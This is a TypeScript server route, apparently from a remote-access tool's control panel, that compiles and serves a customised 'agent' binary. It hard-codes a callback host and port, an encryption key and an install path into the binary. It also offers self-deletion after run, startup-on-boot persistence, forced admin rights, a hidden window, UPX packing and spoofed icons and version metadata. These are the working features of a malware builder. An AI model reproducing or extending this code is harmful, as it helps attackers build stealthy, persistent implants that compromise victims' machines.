import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { mkdtemp, rm, mkdir, copyFile, chmod, cp, writeFile } from 'node:fs/promises';
import { dirname, join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { spawn } from 'node:child_process';
import type { SpawnOptionsWithoutStdio } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { type BuildRequest, type BuildResponse } from '../../../../../shared/types/build';
import {
	hasFileInformationPayload,
	mutexSanitizer,
	normalizeBuildRequestPayload,
	parseVersionParts,
	sanitizeFileInformationPayload,
	type NormalizedFileInformation
} from './normalizer';

const maxIconBytes = 512 * 1024;

function encodeBase64(value: string): string {
	return Buffer.from(value, 'utf8').toString('base64');
}

type NormalizedFileIcon = { filename: string; buffer: Buffer } | null;

function sanitizeIconFilename(name: string | null | undefined): string {
	if (typeof name !== 'string') {
		return 'icon.ico';
	}
	const trimmed = name.trim();
	if (!trimmed) {
		return 'icon.ico';
	}
	const lower = trimmed.toLowerCase();
	if (!lower.endsWith('.ico')) {
		return 'icon.ico';
	}
	const safe = trimmed.replace(mutexSanitizer, '_').slice(0, 64);
	return safe || 'icon.ico';
}

function normalizeFileIcon(
	payload: BuildRequest['fileIcon'] | null | undefined
): NormalizedFileIcon {
	if (!payload || typeof payload.data !== 'string') {
		return null;
	}
	const trimmed = payload.data.trim();
	if (!trimmed) {
		return null;
	}
	let buffer: Buffer;
	try {
		buffer = Buffer.from(trimmed, 'base64');
	} catch {
		throw error(400, 'Icon payload must be valid base64 data.');
	}
	if (buffer.length === 0) {
		return null;
	}
	if (buffer.length > maxIconBytes) {
		throw error(400, `Icon payload exceeds ${maxIconBytes} bytes.`);
	}
	return {
		filename: sanitizeIconFilename(payload.name ?? null),
		buffer
	};
}

function buildVersionInfoConfig(
	info: NormalizedFileInformation,
	iconFileName: string | null
): Record<string, unknown> {
	const config: Record<string, unknown> = {
		VarFileInfo: {
			Translation: {
				LangID: '0409',
				CharsetID: '04B0'
			}
		}
	};

	if (iconFileName) {
		config.IconPath = iconFileName;
	}

	if (hasFileInformationPayload(info)) {
		config.StringFileInfo = info;
	}

	const fileVersion = parseVersionParts(info.FileVersion);
	const productVersion = parseVersionParts(info.ProductVersion);

	if (fileVersion || productVersion) {
		config.FixedFileInfo = {
			FileVersion: fileVersion ?? { Major: 0, Minor: 0, Patch: 0, Build: 0 },
			ProductVersion: productVersion ?? fileVersion ?? { Major: 0, Minor: 0, Patch: 0, Build: 0 },
			FileFlagsMask: '3f',
			FileFlags: '00',
			FileOS: '040004',
			FileType: '01',
			FileSubtype: '00'
		} satisfies Record<string, unknown>;
	}

	return config;
}

async function runCommand(
	command: string,
	args: readonly string[],
	options: SpawnOptionsWithoutStdio,
	output: string[]
): Promise<number> {
	return await new Promise((resolveCommand, rejectCommand) => {
		const child = spawn(command, args, options);

		child.stdout?.on('data', (chunk) => {
			output.push(chunk.toString());
		});

		child.stderr?.on('data', (chunk) => {
			output.push(chunk.toString());
		});

		child.on('error', rejectCommand);
		child.on('close', (code) => resolveCommand(code ?? 0));
	});
}

async function compressBinaryWithUpx(
	binaryPath: string,
	output: string[],
	warnings: string[]
): Promise<void> {
	try {
		const exitCode = await runCommand(
			'upx',
			['--best', '--lzma', binaryPath],
			{
				cwd: dirname(binaryPath),
				env: process.env,
				stdio: ['pipe', 'pipe', 'pipe']
			},
			output
		);
		if (exitCode !== 0) {
			warnings.push(`Binary compression exited with code ${exitCode}. Artifact left uncompressed.`);
		}
	} catch (err) {
		const code = (err as NodeJS.ErrnoException).code;
		if (code === 'ENOENT') {
			warnings.push('Compression skipped: upx binary is not available in the build environment.');
			return;
		}
		const message = err instanceof Error ? err.message : 'Unknown compression error.';
		warnings.push(`Compression failed: ${message}`);
	}
}

function generateSharedSecret(): string {
	return randomBytes(32).toString('hex');
}

export const POST: RequestHandler = async ({ request }) => {
	let body: unknown;
	try {
		body = await request.json();
	} catch {
		throw error(400, 'Invalid build payload');
	}

	const normalized = normalizeBuildRequestPayload(body);
	const {
		host,
		port,
		targetOS,
		targetArch,
		outputFilename,
		installationPath,
		meltAfterRun,
		startupOnBoot,
		developerMode,
		mutexName,
		compressBinary,
		forceAdmin,
		pollIntervalMs,
		maxBackoffMs,
		shellTimeoutSeconds,
		fileIcon,
		fileInformation
	} = normalized;
	const sharedSecret = generateSharedSecret();
	const iconPayload = normalizeFileIcon(fileIcon ?? null);
	const fileInformationPayload = sanitizeFileInformationPayload(fileInformation ?? null);
	const shouldEmbedResources =
		targetOS === 'windows' &&
		(iconPayload !== null || hasFileInformationPayload(fileInformationPayload));

	const repoRoot = resolve(process.cwd(), '..');
	let tempDir: string | null = null;
	const buildOutput: string[] = [];
	const warnings: string[] = [];

	try {
		tempDir = await mkdtemp(join(tmpdir(), 'tenvy-build-'));
		const workDir = join(tempDir, 'src');
		await cp(join(repoRoot, 'tenvy-client'), workDir, { recursive: true });
		const tempBinaryPath = join(tempDir, outputFilename);

		const ldflagsParts = [
			`-X main.defaultServerHostEncoded=${encodeBase64(host)}`,
			`-X main.defaultServerPortEncoded=${encodeBase64(port)}`,
			`-X main.defaultInstallPathEncoded=${encodeBase64(installationPath)}`,
			`-X main.defaultEncryptionKeyEncoded=${encodeBase64(sharedSecret)}`,
			`-X main.defaultMeltAfterRun=${meltAfterRun ? 'true' : 'false'}`,
			`-X main.defaultStartupOnBoot=${startupOnBoot ? 'true' : 'false'}`,
			`-X main.defaultMutexKeyEncoded=${encodeBase64(mutexName)}`,
			`-X main.defaultForceAdminRequirement=${forceAdmin ? 'true' : 'false'}`
		];

		if (pollIntervalMs) {
			ldflagsParts.push(`-X main.defaultPollIntervalOverrideMs=${pollIntervalMs}`);
		}
		if (maxBackoffMs) {
			ldflagsParts.push(`-X main.defaultMaxBackoffOverrideMs=${maxBackoffMs}`);
		}
		if (shellTimeoutSeconds) {
			ldflagsParts.push(`-X main.defaultShellTimeoutOverrideSecs=${shellTimeoutSeconds}`);
		}
		if (compressBinary) {
			ldflagsParts.push('-s -w');
		}

		if (!developerMode && targetOS === 'windows') {
			ldflagsParts.push('-H=windowsgui');
		}

		if (shouldEmbedResources) {
			const cmdDir = join(workDir, 'cmd');
			const iconFileName = iconPayload?.filename ?? null;
			const versionConfig = buildVersionInfoConfig(fileInformationPayload, iconFileName);
			await writeFile(
				join(cmdDir, 'versioninfo.json'),
				`${JSON.stringify(versionConfig, null, 2)}\n`,
				'utf8'
			);
			if (iconPayload) {
				await writeFile(join(cmdDir, iconPayload.filename), iconPayload.buffer);
			}
			const goversionArgs = [
				'run',
				'github.com/josephspurrier/goversioninfo/cmd/goversioninfo@v1.4.0',
				'-64'
			] as const;
			const goversionExit = await runCommand(
				'go',
				goversionArgs,
				{
					cwd: cmdDir,
					env: process.env,
					stdio: ['pipe', 'pipe', 'pipe']
				},
				buildOutput
			);
			if (goversionExit !== 0) {
				warnings.push(
					`Embedding Windows resources failed with exit code ${goversionExit}. Continuing without version metadata.`
				);
			}
		}

		const ldflags = ldflagsParts.join(' ');

		const goArgs = ['build', '-ldflags', ldflags, '-o', tempBinaryPath, './cmd'] as const;
		const goEnv = {
			...process.env,
			GOOS: targetOS,
			GOARCH: targetArch,
			CGO_ENABLED: '0'
		} satisfies NodeJS.ProcessEnv;

		const exitCode = await runCommand(
			'go',
			goArgs,
			{
				cwd: workDir,
				env: goEnv,
				stdio: ['pipe', 'pipe', 'pipe']
			},
			buildOutput
		);

		if (exitCode !== 0) {
			const logLines = buildOutput
				.join('')
				.split(/\r?\n/)
				.filter((line) => line.trim().length > 0);
			const response: BuildResponse = {
				success: false,
				message: `go build failed with exit code ${exitCode}`,
				log: logLines,
				warnings
			};
			return json(response, { status: 200 });
		}

		if (compressBinary) {
			await compressBinaryWithUpx(tempBinaryPath, buildOutput, warnings);
		}

		const logLines = buildOutput
			.join('')
			.split(/\r?\n/)
			.filter((line) => line.trim().length > 0);

		const buildsDir = join(repoRoot, 'tenvy-server', 'static', 'builds');
		await mkdir(buildsDir, { recursive: true });
		const finalPath = join(buildsDir, outputFilename);

		await copyFile(tempBinaryPath, finalPath);
		await chmod(finalPath, 0o755);

		const response: BuildResponse = {
			success: true,
			message: 'Agent built successfully',
			outputPath: finalPath,
			downloadUrl: `/builds/${encodeURIComponent(outputFilename)}`,
			log: logLines,
			sharedSecret,
			warnings
		};

		return json(response);
	} catch (err) {
		const captured = buildOutput
			.join('')
			.split(/\r?\n/)
			.filter((line) => line.trim().length > 0);

		if (err instanceof Error && (err as NodeJS.ErrnoException).code === 'ENOENT') {
			return json(
				{
					success: false,
					message: 'Go compiler is not available in the build environment.',
					log: captured,
					warnings
				},
				{ status: 200 }
			);
		}

		const message = err instanceof Error ? err.message : 'Failed to build agent';
		return json(
			{
				success: false,
				message,
				log: captured,
				warnings
			},
			{ status: 200 }
		);
	} finally {
		if (tempDir) {
			await rm(tempDir, { recursive: true, force: true });
		}
	}
};
